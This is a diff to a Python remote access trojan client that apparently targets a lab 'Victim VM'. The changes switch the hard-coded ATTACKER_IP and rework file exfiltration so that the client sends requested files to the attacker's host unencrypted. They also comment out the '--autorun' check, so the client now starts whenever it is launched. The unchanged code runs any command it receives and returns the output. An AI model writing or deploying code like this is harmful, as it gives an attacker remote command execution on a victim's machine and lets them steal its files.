@@ -13,7 +13,7 @@ from cryptography.hazmat.backends import default_backend
 import base64
 import os as crypto_os
 
-ATTACKER_IP = "10.0.3.20"
+ATTACKER_IP = "192.168.1.18"
 ATTACKER_PORT = 9999
 BUFFER_SIZE = 4096
 RECONNECT_DELAY = 5
@@ -171,16 +171,16 @@ def send_file(sock, filepath):
     filename = os.path.basename(filepath)
     header = f"download_result {filename} {filesize}"
     sock.sendall(encrypt_data(header.encode('utf-8')))
+    time.sleep(0.3)
 
     with open(filepath, "rb") as f:
         while True:
-            chunk = f.read(1024)
+            chunk = f.read(BUFFER_SIZE)
             if not chunk:
                 break
-            enc_chunk = encrypt_data(chunk)
-            sock.sendall(len(enc_chunk).to_bytes(4, 'big'))
-            sock.sendall(enc_chunk)
-    debug_print(f"File {filename} sent successfully.")
+            sock.sendall(chunk)
+
+    debug_print(f"[+] Fichier '{filename}' envoyé ({filesize} octets)")
 
 def main():
     debug_print("RAT Client started.")
@@ -212,15 +212,16 @@ def main():
                 decrypted_command = decrypt_data(data).decode('utf-8', errors='ignore').strip()
                 debug_print(f"Received command: {decrypted_command}")
 
-                if decrypted_command.startswith("upload "):
+                if decrypted_command.startswith("download "):
                     parts = decrypted_command.split(" ", 2)
-                    if len(parts) == 3:
+                    if len(parts) == 2:
                         filepath = parts[1]
                         try:
                             send_file(sock, filepath)
                         except Exception as e:
                             debug_print(f"Error sending file: {e}")
                     continue
+                
 
                 output = execute_command(decrypted_command)
                 response = f"[Output from Victim VM]\n{output}\n[End of Output]\n"
@@ -259,6 +260,6 @@ def main():
         debug_print("RAT Client exiting.")
 
 if __name__ == "__main__":
-    if "--autorun" not in sys.argv:
-        sys.exit(0)
+    # if "--autorun" not in sys.argv:
+    #     sys.exit(0)
     main()
